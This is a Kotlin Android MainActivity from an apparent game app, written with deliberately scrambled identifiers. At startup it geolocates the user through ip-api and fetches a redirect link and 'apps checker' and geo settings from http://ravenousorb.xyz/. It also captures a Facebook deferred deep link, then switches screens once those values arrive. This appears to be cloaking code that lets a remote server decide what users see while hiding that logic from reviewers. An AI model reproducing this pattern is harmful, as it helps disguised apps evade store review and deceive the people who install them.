package com.superplusgames.hosandroi


import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.superplusgames.hosandroi.aaaaactivv.SortOOnneActivity
import com.superplusgames.hosandroi.databinding.ActivityMainBinding
import com.superplusgames.hosandroi.ottther.Saaasha.DEEPLfrtggttggtfrfrfr
import com.superplusgames.hosandroi.ottther.Saaasha.appsCheckfrr6656565
import com.superplusgames.hosandroi.ottther.Saaasha.countryCodefrrfrfrfrrfgt5tg5gt56
import com.superplusgames.hosandroi.ottther.Saaasha.geomeogtgtgtgtgt5
import com.superplusgames.hosandroi.ottther.Saaasha.linkfrrrfrffrgt5gtgt5t6g
import com.superplusgames.hosandroi.ottther.ServiceApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private lateinit var gtgtgttg: ActivityMainBinding

    fun tijgjitgjtgjtgj(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val aaaaaapapappa = appLinkData.targetUri.host.toString()
                Hawk.put(DEEPLfrtggttggtfrfrfr, aaaaaapapappa)
            }
            if (appLinkData == null) {
            }
        }
    }

    private suspend fun tjightuhghuthghut() {
        val kggtjigtjigt = "http://ravenousorb.xyz/"

        val yhhyyyh = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl(kggtjigtjigt)
            .build()
            .create(ServiceApi::class.java)
        val frfrrfgr = yhhyyyh.getDataDev().body()?.viewSasha.toString()
        val appsCheckerfgtt = yhhyyyh.getDataDev().body()?.appsCheckerSasha.toString()
        val retroDatafrffr = yhhyyyh.getDataDev().body()?.geoSasha.toString()

        Hawk.put(linkfrrrfrffrgt5gtgt5t6g, frfrrfgr)
        Hawk.put(appsCheckfrr6656565, appsCheckerfgtt)
        Hawk.put(geomeogtgtgtgtgt5, retroDatafrffr)

    }


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        gtgtgttg = ActivityMainBinding.inflate(layoutInflater)
        setContentView(gtgtgttg.root)

        tijgjitgjtgjtgj(this)

        val gtghyhyyhhyhyhyhy = Executors.newSingleThreadScheduledExecutor()
        var yhyju5j5: String? = Hawk.get(countryCodefrrfrfrfrrfgt5tg5gt56, null)
        var gtg5tg5gt5gt: String? = Hawk.get(geomeogtgtgtgtgt5, null)
        gtghyhyyhhyhyhyhy.scheduleAtFixedRate({
            if (yhyju5j5 != null && gtg5tg5gt5gt != null) {
                gtghyhyyhhyhyhyhy.shutdown()
                gttgtth()
            } else {
                yhyju5j5 = Hawk.get(countryCodefrrfrfrfrrfgt5tg5gt56)
                gtg5tg5gt5gt = Hawk.get(geomeogtgtgtgtgt5)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            frfrrfrf
        }
    }


    private fun gttgtth() {
        val frfrgrt = Intent(this@MainActivity, SortOOnneActivity::class.java)
        startActivity(frfrgrt)
        gtkgktktggkotk()
    }

    private fun gtkgktktggkotk() {
        finish()
    }


    private suspend fun gtkhoykhyjhiy() {
        val gtgtgtgt = "http://pro.ip-api.com/"
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl(gtgtgtgt)
            .build()
            .create(ServiceApi::class.java)
        val retData = retrofitBuilder.getData().body()?.countryCodefgtgt
        Hawk.put(countryCodefrrfrfrfrrfgt5tg5gt56, retData)
    }

    private val frfrrfrf: Job = GlobalScope.launch(Dispatchers.IO) {
        gtkhoykhyjhiy()
        tjightuhghuthghut()
    }


}